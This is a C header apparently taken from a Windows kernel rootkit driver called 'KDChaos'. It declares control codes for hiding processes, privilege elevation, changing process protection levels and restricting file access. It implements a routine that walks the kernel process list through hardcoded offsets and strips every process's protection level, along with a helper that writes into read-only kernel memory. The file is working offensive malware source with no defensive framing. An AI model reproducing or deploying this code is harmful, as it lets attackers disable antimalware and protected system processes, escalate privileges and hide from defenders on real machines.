#pragma once
#include <ntifs.h>
#include <ntdef.h>
#include <minwindef.h>
#include <ntstrsafe.h>
#include <wdm.h>
#include <fltkernel.h>
#include <ntddk.h>


#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_SYSTEM CTL_CODE(FILE_DEVICE_UNKNOWN,0x91,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB CTL_CODE(FILE_DEVICE_UNKNOWN,0x92,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS CTL_CODE(FILE_DEVICE_UNKNOWN,0x93,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE CTL_CODE(FILE_DEVICE_UNKNOWN,0x94,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x95,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x96,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_LSA_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x97,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x98,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x99,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define RESTRICT_ACCESS_TO_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x169,METHOD_BUFFERED ,FILE_ANY_ACCESS)

UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");

UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");

char* PsGetProcessImageFileName(PEPROCESS Process);

EX_PUSH_LOCK pLock;

typedef struct foperationx {
    int rpid;
    char filename[MAX_PATH];
}fopera, * Pfoperation;


DWORD UnprotectAllProcesses() {
    PVOID process = NULL;
    PLIST_ENTRY plist;
    __try
    {

        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
        if (ret != STATUS_SUCCESS)
        {
            if (ret == STATUS_INVALID_PARAMETER)
            {
                DbgPrint("the process ID was not found.");
            }
            if (ret == STATUS_INVALID_CID)
            {
                DbgPrint("the specified client ID is not valid.");
            }
            return (-1);
        }

        plist = (PLIST_ENTRY)((char*)process + 0x448);

        while (plist->Flink != (PLIST_ENTRY)((char*)process + 0x448))
        {
            DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);

            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - 0x448 + 0x87a;

            *(BYTE*)EProtectionLevel = (BYTE)0;

            plist = plist->Flink;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return (-1);
    }
}

DWORD write_to_read_only_memory(void* address, void* buffer, size_t size)
{
    PMDL Mdl = IoAllocateMdl(address, size, FALSE, FALSE, NULL);

    if (!Mdl)
    {
        DbgPrint("MDL cannot be allocated\n");
        return -1;
    }

    MmProbeAndLockPages(Mdl, KernelMode, IoReadAccess);

    PVOID Mapping = MmMapLockedPagesSpecifyCache(Mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    
    if (MmProtectMdlSystemAddress(Mdl, PAGE_READWRITE) != STATUS_SUCCESS)
    {
        DbgPrint("MDL cannot be allocated\n");

        return -1;
    }

    RtlCopyMemory(Mapping, buffer, size);

    MmUnmapLockedPages(Mapping, Mdl);

    MmUnlockPages(Mdl);

    IoFreeMdl(Mdl);

    return 0;

}
